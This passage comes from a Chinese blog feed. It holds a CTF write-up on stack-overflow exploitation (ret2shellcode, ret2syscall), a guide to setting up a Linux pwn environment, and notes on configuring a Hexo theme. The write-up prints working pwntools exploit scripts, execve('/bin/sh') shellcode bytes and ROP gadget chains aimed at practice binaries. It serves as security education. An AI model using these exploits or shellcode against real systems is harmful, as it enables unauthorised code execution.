class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>然后执行脚本，就可以看到能成功获取shell</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565505765436.png" alt="1565505765436"></p><h2 id="ret2shellcode">ret2shellcode</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode"><strong>题目下载</strong></a></p><p>拿到题目，同样的思路，检查是否有保护</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565506056537.png" alt="1565506056537"></p><p>可以看到，程序没有开启任何保护，并且有可读，可写，可执行段</p><p>丢到IDA里，可以看到仍然是基本的gets函数溢出漏洞。与同样搜索<code>system</code></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565506056537.png" alt="1565506226726"></p><p>没有可利用的程序段，回过来继续看程序的伪c代码，与之前的ret2text区别是少了system</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565506522139.png" alt="1565506522139"></p><p>发现程序将gets获取到的字符串复制了一份给buf2，那么我们就可以考虑是不是可以让程序跳转到buf2的位置执行</p><p>在IDA中跳转查看，可知buf2在.bss段，地址为<code>0x0804A080</code></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565506840193.png" alt="1565506840193"></p><p>在gdb中进行调试，可以知道.bss段所在位置具有可执行权限</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565507061003.png" alt="1565507061003"></p><p>程序中没有可以用来执行<code>/bin/sh</code>的代码，我们就需要自己构造生成shellcode（一段完成特定功能的代码），pwntools给我们提供了一个很好的生成shellcode的方法——<code>shellcraft.sh()</code>，使用这个工具，我们可以生成44个字节的shellcode</p><blockquote><p><a href="http://shellcraft.sh">shellcraft.sh</a>()生成的是执行shell的汇编代码，需要asm()函数转换为机器代码（即16进制）</p></blockquote><p>分析完了之后我们就可以编写exp了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">buf2 = <span class="number">0x0804A080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>) + p32(buf2)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="练习：sniperoj-pwn100-shellcode-x86-64">练习：sniperoj-pwn100-shellcode-x86-64</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/sniperoj-pwn100-shellcode-x86-64/shellcode"><strong>题目下载</strong></a></p><p>同样先查看程序保护情况</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565517281357.png" alt="1565517281357"></p><p>程序只开启了PIE地址随机化保护，其他的保护都没有开启</p><p>将程序丢进IDA打探一下情况</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565517424714.png" alt="1565517424714"></p><p>可以明显的发现程序可能具有read函数溢出漏洞，并且程序将buf的地址打印了出来，所以PIE的开启就没有什么用处了。</p><p>依旧查找一下<code>system</code>函数或者<code>/bin/sh</code>，无果。</p><p>因为程序没有开启堆栈保护，所以我们可以考虑溢出执行shellcode，从而获得系统shell。</p><p>先使用gdb调试，找到程序应该填充的数据量</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565518569834.png" alt="1565518569834"></p><p>程序的伪c代码中没有buf相对于esp的偏移量，所以我们的offset=0x10+8=24，这时候我们可用的shellcode的空间只有24字节，但是我们平常使用<code>shellcraft.sh()</code>所生成的shellcode有44个字节，显然就不能使用了，需要我们另觅它路。</p><blockquote><p>这里推荐两个查找shellcode的网站：<br><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a><br><a href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a></p></blockquote><p>找到一个只有23字节的shellcode，刚好符合我们的要求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode_x64 = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br></pre></td></tr></table></figure><p>这里顺便将32位的shellcode也贴出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode_x86 = <span class="string">&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode_x86 += <span class="string">&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode_x86 += <span class="string">&quot;\x0b\xcd\x80&quot;</span></span><br></pre></td></tr></table></figure><p>之后就可以编写exp了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./sniperoj-pwn100-shellcode-x86-64&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">buf = sh.recvuntil(<span class="string">&#x27;]&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">shellcode_addr = <span class="built_in">int</span>(buf,<span class="number">16</span>) + <span class="number">24</span> + <span class="number">8</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">24</span> + p64(shellcode_addr) + shellcode</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这里的<code>shellcode_addr</code>是buf的起始地址加上填充的数据长度和ret返回地址的长度，因为<code>buf</code>后面 <code>0x10+8</code> 大小的空间都不可以使用，因为 <code>leave</code> 指令会将这一段的栈空间弹出。</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565524045363.png" alt="栈的情况"></p><p>这个payload的长度是55，小于read函数中所限定的 0x40 ，若是需要修复题目漏洞，可以把read函数限定的0x40的长度改为0x24或者更小的数。</p><h2 id="ret2syscall">ret2syscall</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop"><strong>题目下载</strong></a></p><p>老样子，检查程序保护，发现除了NX其他都没有开启，然后丢到IDA里面</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565527903300.png" alt="1565527903300"></p><p>程序跟之前的没什么两样，仍然是gets函数造成栈溢出，只是没有了system和shellcode可利用。我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。</p><p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,NULL,NULL)</span><br></pre></td></tr></table></figure><p>该程序是 32 位，所以我们需要使得</p><ul><li>系统调用号，即 eax 应该为 0xb（对应的系统调用为execve）</li><li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><h3 id="几个常用的系统调用（int-0x80）">几个常用的系统调用（int 0x80）</h3><ul><li><strong>32位</strong></li></ul><table><thead><tr><th style="text-align:center">NAME</th><th style="text-align:center">EAX</th><th style="text-align:center">EBX</th><th style="text-align:center">ECX</th><th style="text-align:center">EDX</th></tr></thead><tbody><tr><td style="text-align:center">sys_exit</td><td style="text-align:center">1</td><td style="text-align:center">int</td><td style="text-align:center">0</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">sys_read</td><td style="text-align:center">3</td><td style="text-align:center">unsigned int</td><td style="text-align:center">char *</td><td style="text-align:center">size_t</td></tr><tr><td style="text-align:center">sys_write</td><td style="text-align:center">4</td><td style="text-align:center">unsigned int</td><td style="text-align:center">const_char *</td><td style="text-align:center">size_t</td></tr><tr><td style="text-align:center">sys_open</td><td style="text-align:center">5</td><td style="text-align:center">const char *</td><td style="text-align:center">int</td><td style="text-align:center">int</td></tr><tr><td style="text-align:center">sys_execve</td><td style="text-align:center">11</td><td style="text-align:center">const char *</td><td style="text-align:center">0</td><td style="text-align:center">0</td></tr></tbody></table><p>PS：最常用的为11号调用。也就是<code>execve(&quot;/bin/sh&quot;,0,0)</code>。</p><ul><li><strong>64位</strong></li></ul><table><thead><tr><th style="text-align:center">NAME</th><th style="text-align:center">%rax</th><th style="text-align:center">%rdi</th><th style="text-align:center">%rsi</th><th style="text-align:center">%rdx</th></tr></thead><tbody><tr><td style="text-align:center">sys_read</td><td style="text-align:center">0</td><td style="text-align:center">unsigned int</td><td style="text-align:center">char *</td><td style="text-align:center">size_t</td></tr><tr><td style="text-align:center">sys_write</td><td style="text-align:center">1</td><td style="text-align:center">unsigned int</td><td style="text-align:center">const_char *</td><td style="text-align:center">size_t</td></tr><tr><td style="text-align:center">sys_open</td><td style="text-align:center">2</td><td style="text-align:center">const char *</td><td style="text-align:center">int</td><td style="text-align:center">int</td></tr><tr><td style="text-align:center">sys_execve</td><td style="text-align:center">59</td><td style="text-align:center">const char *</td><td style="text-align:center">0</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">sys_exit</td><td style="text-align:center">60</td><td style="text-align:center">int error_code</td><td style="text-align:center">0</td><td style="text-align:center">0</td></tr></tbody></table><p>这里寄存器的值的控制需要使用gadgets，比如，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p><p>首先来寻找控制eax的gadgets</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565530684650.png" alt="1565530684650"></p><p>这里选用第二个最短的作为我们的gadget，类似也可以得到其它寄存器的gadgets</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565530684650.png" alt="1565530803166"></p><p>这里可以选择</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>这个可以直接控制<code>edx</code> 、<code>ecx</code> 、<code>ebx</code>三个寄存器</p><p>另外，我们还需要获得 <code>/bin/sh</code> 字符串对应的地址，依旧使用ROPgadget</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ret2syscall --string &#x27;/bin/sh&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565530803166.png" alt="1565530935236"></p><p>继续找<code>int 0x80</code>的地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ret2syscall --only &#x27;int&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565531103186.png" alt="1565531103186"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2syscall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">0x70</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int80])</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这里附上整个exploit的执行过程</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/%E6%A0%88.gif" alt="栈"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF做题环境linux系统的配置</title>
      <link href="/posts/4aab5453.html"/>
      <url>/posts/4aab5453.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>新安装了Linux的虚拟机作为pwn的做题环境，在这里我用的是Ubuntu 18.04.2 LTS版本</p></blockquote><h2 id="基础编译环境">基础编译环境</h2><p>由于是使用的VMware简易安装，系统里好像并没有基础的编译运行环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc</span><br><span class="line">sudo apt-get install g++</span><br><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure><p>在编译pwn题目时，可能会遇到</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In file included from stack_example.c:1:0:</span><br><span class="line">/usr/include/stdio.h:27:10: fatal error: bits/libc-header-start.h: No such file or directory</span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash">include &lt;bits/libc-header-start.h&gt;</span></span><br><span class="line">          ^~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">compilation terminated.</span><br></pre></td></tr></table></figure><p>这是由于gcc环境没有安装完善</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-multilib</span><br></pre></td></tr></table></figure><h2 id="安装pwntools-参考">安装pwntools<a href="http://docs.pwntools.com/en/stable/install.html">[参考]</a></h2><h4 id="安装所需要的系统运行库及环境">安装所需要的系统运行库及环境</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</span><br></pre></td></tr></table></figure><p>pwntools是作为一个pip包提供，所以我们先换一下pip的源<br>修改pip配置文件（没有的话就新建一个）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir ~/.config/pip</span><br><span class="line">sudo vim ~/.config/pip/pip.conf</span><br></pre></td></tr></table></figure><p>添加清华的pip镜像源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><p>升级pip包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>安装pwntools</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><p>这里可能会提示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/usr/bin/pip&quot;, line 9, in &lt;module&gt;</span><br><span class="line">    from pip import main</span><br><span class="line">ImportError: cannot import name main</span><br></pre></td></tr></table></figure><p>需要我们要修改一个文件来解决</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /usr/bin/pip</span><br></pre></td></tr></table></figure><p>将原来的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pip import main</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">sys.exit(main())</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pip import __main__</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">sys.exit(__main__._main())</span><br></pre></td></tr></table></figure><p>可以使用python测试是否安装成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python</span><br></pre></td></tr></table></figure><p>进入python命令行状态后输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><p>如果没有报错，则代表安装成功</p><h2 id="安装LibcSearcher-参考">安装LibcSearcher<a href="https://github.com/lieanu/LibcSearcher">[参考]</a></h2><p>用作根据泄露的libc中某一个函数的地址找到对应的lbc版本。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/lieanu/LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">python setup.py develop</span><br></pre></td></tr></table></figure><p>这里git clone要下载数据库（大概一百多兆），emmm由于GitHub这身体状态，建议直接下载解压或者添加代理……不然等一晚上也不是没有可能</p><h4 id="示例">示例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;fgets&quot;</span>, <span class="number">0X7ff39014bd90</span>)</span><br><span class="line"></span><br><span class="line">obj.dump(<span class="string">&quot;system&quot;</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;__libc_start_main_ret&quot;</span>)    </span><br></pre></td></tr></table></figure><h2 id="安装peda插件">安装peda插件</h2><p>peda作为gdb的一个强大的插件，非常之好用<br>安装它也很简单，只需要两行命令~</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda </span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><p>安装完输入<code>gdb</code><br>若显示 <code>gdb-peda$ </code>则代表安装成功</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Linux </tag>
            
            <tag> 环境配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo进阶——主题和功能的完善</title>
      <link href="/posts/87613c70.html"/>
      <url>/posts/87613c70.html</url>
      
        <content type="html"><![CDATA[<p>花费了一天的时间搭建Hexo博客，总算是有个雏形，可是默认的主题总觉得有些丑，决定换个主题再继续折腾一番……这篇文章主要记录一下主题的安装、配置与美化，以及配置过程中遇到的一些问题–</p><h2 id="找一个适合自己的主题">找一个适合自己的主题</h2><p>Hexo官网上提供了几百种样式的主题，可以从这里面去寻找自己喜欢的<a href="https://hexo.io/themes/">Hexo Themes</a></p><p>经过一番骚操作，最终相中了<a href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a>这个主题，真是深得我心</p><h2 id="对主题进行安装和配置">对主题进行安装和配置</h2><p>Butterfly主题也有比较详细的安装配置方法，照着这个<a href="https://jerryc.me/posts/21cfbf15/">hexo-theme-butterfly安装文档</a>一步一步自己进行配置就可以~</p><h3 id="配置时遇到的问题">配置时遇到的问题</h3><p>尽管主题的官方文档已经说的很详细，但是我在配置的过程中还是遇到了一丢丢小问题，在此记录：</p><h4 id="1-Algolia搜索">1. Algolia搜索</h4><p>在启用Algolia搜索系统的时候，在Algolia的配置上遇到了很大的问题，ID和Key什么的都没有配置好，也许是我英语水平太低，没能理解<a href="https://github.com/oncletom/hexo-algolia">官方配置文档</a>所致。这里附一篇中文的配置介绍——<a href="https://juejin.im/post/5af3f9d1518825673e35a6eb">Hexo+Next集成Algolia搜索</a>。参考这一篇文章再自己进行配置就容易多了</p><h4 id="2-新建文章时的默认模板">2. 新建文章时的默认模板</h4><p>当我们使用 <code>hexo new &quot;filename&quot;</code>新建一个文章的时候，会使用默认的模板建立</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1564731851768.png" alt="1564731851768"></p><p>为了配合主题更好的使用，我们可以把默认模板修改成与主题相符的<a href="https://jerryc.me/posts/21cfbf15/#%E4%B8%BB%E9%A1%8C%E9%A0%81%E9%9D%A2">主题页面</a></p><p>模板文件在博客根目录的 <code>scaffolds</code>文件夹下</p><p>修改 <code>page.md</code></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">type: （tags,link,categories这三个页面需要配置）</span><br><span class="line">comments: (是否需要显示评论，默认true)</span><br><span class="line">description:</span><br><span class="line"><span class="section">top<span class="emphasis">_img: (设置顶部图)</span></span></span><br><span class="line"><span class="emphasis"><span class="section">---</span></span></span><br></pre></td></tr></table></figure><p>修改 <code>post.md</code></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">tags:</span><br><span class="line">categories:</span><br><span class="line">keywords:</span><br><span class="line">description:</span><br><span class="line">top<span class="emphasis">_img: （除非特定需要，可以不写）</span></span><br><span class="line"><span class="emphasis">comments:  是否显示评论（除非设置false,可以不写）</span></span><br><span class="line"><span class="emphasis">cover:  缩略图</span></span><br><span class="line"><span class="emphasis">toc:  是否显示toc （除非特定文章设置，可以不写）</span></span><br><span class="line"><span class="emphasis">toc_</span>number: 是否显示toc数字 （除非特定文章设置，可以不写）</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h4 id="3-本地上传的图片无法加载">3. 本地上传的图片无法加载</h4><p>如果需要配置加载本地图片，  在站点配置文件<code>_config.yml</code>中找到<code>post_asset_folder</code>，设置为<code>true</code>。</p><p>之后在运行<code>hexo new</code>时，会自动创建一个与.md文件同名的文件夹，可以将与文章相关的所有资源放在这个文件夹中，方便引用。</p><p>另外还需要安装图片上传插件，在博客根目录运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure><p>然后正常生成部署即可</p><p>但是！</p><p>在我这里出现了一丢丢问题，图片依然无法加载，在网页查看图片的链接发现被改成了<code>baymrx.me/.me//**.png</code>这种形式，，令我百思不得其解。后来经查阅资料发现是插件的脚本问题。</p><p>进入博客根目录下的<code>node_modules</code>文件夹，找到<code>hexo-asset-image</code>，，打开文件夹下的<code>index.js</code>文件，我这里贴出部分源代码（出现问题的代码）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">hexo.<span class="property">extend</span>.<span class="property">filter</span>.<span class="title function_">register</span>(<span class="string">&#x27;after_post_render&#x27;</span>, <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> config = hexo.<span class="property">config</span>;</span><br><span class="line">  <span class="keyword">if</span>(config.<span class="property">post_asset_folder</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> link = data.<span class="property">permalink</span>;</span><br><span class="line">    <span class="keyword">var</span> beginPos = <span class="title function_">getPosition</span>(link, <span class="string">&#x27;/&#x27;</span>, <span class="number">3</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> appendLink = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">// In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.</span></span><br><span class="line">    <span class="comment">// if not with index.html endpos = link.lastIndexOf(&#x27;.&#x27;) + 1 support hexo-abbrlink</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="regexp">/.*\/index\.html$/</span>.<span class="title function_">test</span>(link)) &#123;</span><br><span class="line">      <span class="comment">// when permalink is end with index.html, for example 2019/02/20/xxtitle/index.html</span></span><br><span class="line">      <span class="comment">// image in xxtitle/ will go to xxtitle/index/</span></span><br><span class="line">      appendLink = <span class="string">&#x27;index/&#x27;</span>;</span><br><span class="line">      <span class="keyword">var</span> endPos = link.<span class="title function_">lastIndexOf</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> endPos = link.<span class="title function_">lastIndexOf</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    link = link.<span class="title function_">substring</span>(beginPos, endPos) + <span class="string">&#x27;/&#x27;</span> + appendLink;</span><br></pre></td></tr></table></figure><p>这一部分将图片链接的<code>2019/02/20/xxtitle/</code>这一部分提取出来，并存入变量link中，此代码问题出在9–12行的if语句中，这里将<code>index.html</code>作为了判断条件，但实际上文档的url地址中并不显示<code>index.html</code>，导致原本应该截取的永久链变成了<code>.me//</code>。<s>这里我走了一个投机取巧的办法，就是修改第16行的代码，改为</s> 这里官方<a href="https://github.com/xcodebuild/hexo-asset-image/issues/47">issues</a>提出了解决方案，依旧是修改第16行的代码，即源文件的第24行，改为</p><p>​      <s>var endPos = link.lastIndexOf(‘/’);</s></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var endPos = link.length-1; </span><br></pre></td></tr></table></figure><p>这样再重新生成部署博客就可以正常显示本地图片了</p><h4 id="4-文章缩略图无法设置">4. 